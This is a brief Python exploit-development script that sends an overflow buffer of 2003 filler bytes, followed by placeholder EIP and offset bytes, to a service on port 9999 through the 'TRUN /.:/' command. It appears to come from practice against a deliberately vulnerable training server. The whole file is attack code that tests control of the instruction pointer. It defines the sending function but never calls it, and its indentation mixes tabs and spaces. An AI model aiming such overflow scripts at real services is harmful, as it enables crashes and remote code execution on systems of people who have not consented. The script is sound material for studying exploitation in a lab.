import socket

#Target details
target_IP = "192.168.1.135"
port = 9999
#pattern_length = 3000

filler = b"A" * 2003
eip = b"B" * 4
offset = b"C" * 4
inputBuffer = filler + eip + offset


def send_payload(inputBuffer):
 try:
		print("connecting to taget...")
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect ((target_IP, port))
		s.send (b"TRUN /.:/" + inputBuffer)
		print("Payload sent.")
		s.close()
 except Exception as e:	
		print("Connection failed:", e)


		
		
		
